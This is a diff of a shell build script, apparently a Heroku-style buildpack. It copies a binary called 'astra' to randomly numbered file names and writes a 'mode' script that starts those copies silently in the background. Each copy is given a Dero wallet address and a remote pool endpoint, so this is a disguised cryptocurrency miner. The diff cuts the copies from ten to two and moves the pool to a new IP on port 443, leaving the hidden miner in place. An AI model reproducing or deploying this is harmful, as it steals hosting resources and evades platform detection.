@@ -1,14 +1,6 @@
 #!/usr/bin/env bash
 dyno=$(shuf -n 1 -i 100000-999999)
 dyno2=$(shuf -n 1 -i 100000-999999)
-dyno3=$(shuf -n 1 -i 100000-999999)
-dyno4=$(shuf -n 1 -i 100000-999999)
-dyno5=$(shuf -n 1 -i 100000-999999)
-dyno6=$(shuf -n 1 -i 100000-999999)
-dyno7=$(shuf -n 1 -i 100000-999999)
-dyno8=$(shuf -n 1 -i 100000-999999)
-dyno9=$(shuf -n 1 -i 100000-999999)
-dyno10=$(shuf -n 1 -i 100000-999999)
 set -e
 
 mkdir -p "$1/bin/"
@@ -25,37 +17,13 @@ cp -a "$1/bin/astra" "$1/bin/$dyno8"
 cp -a "$1/bin/astra" "$1/bin/$dyno9"
 cp -a "$1/bin/astra" "$1/bin/$dyno10"
 cat > "$1/bin/mode" <<END
-/app/bin/$dyno -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 178.128.200.86:10100 >/dev/null 2.&1 >/dev/null &
+/app/bin/$dyno -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 146.190.106.185:443 >/dev/null 2.&1 >/dev/null &
 sleep 0.1
-/app/bin/$dyno2 -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 178.128.200.86:10100 >/dev/null 2.&1 >/dev/null &
-sleep 0.1
-/app/bin/$dyno3 -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 178.128.200.86:10100 >/dev/null 2.&1 >/dev/null &
-sleep 0.1
-/app/bin/$dyno4 -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 178.128.200.86:10100 >/dev/null 2.&1 >/dev/null &
-sleep 0.1
-/app/bin/$dyno5 -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 178.128.200.86:10100 >/dev/null 2.&1 >/dev/null &
-sleep 0.1
-/app/bin/$dyno6 -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 178.128.200.86:10100 >/dev/null 2.&1 >/dev/null &
-sleep 0.1
-/app/bin/$dyno7 -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 178.128.200.86:10100 >/dev/null 2.&1 >/dev/null &
-sleep 0.1
-/app/bin/$dyno8 -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 178.128.200.86:10100 >/dev/null 2.&1 >/dev/null &
-sleep 0.1
-/app/bin/$dyno9 -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 178.128.200.86:10100 >/dev/null 2.&1 >/dev/null &
-sleep 0.1
-/app/bin/$dyno10 -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 178.128.200.86:10100 >/dev/null 2.&1 >/dev/null &
+/app/bin/$dyno2 -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 146.190.106.185:443 >/dev/null 2.&1 >/dev/null &
 sleep 0.1
 END
 chmod 777 $1/bin/$dyno
 chmod 777 $1/bin/$dyno2
-chmod 777 $1/bin/$dyno3
-chmod 777 $1/bin/$dyno4
-chmod 777 $1/bin/$dyno5
-chmod 777 $1/bin/$dyno6
-chmod 777 $1/bin/$dyno7
-chmod 777 $1/bin/$dyno8
-chmod 777 $1/bin/$dyno9
-chmod 777 $1/bin/$dyno10
 chmod 777 $1/bin/mode
 chmod 777 $1/bin/astra
 chmod 777 $1/bin/client
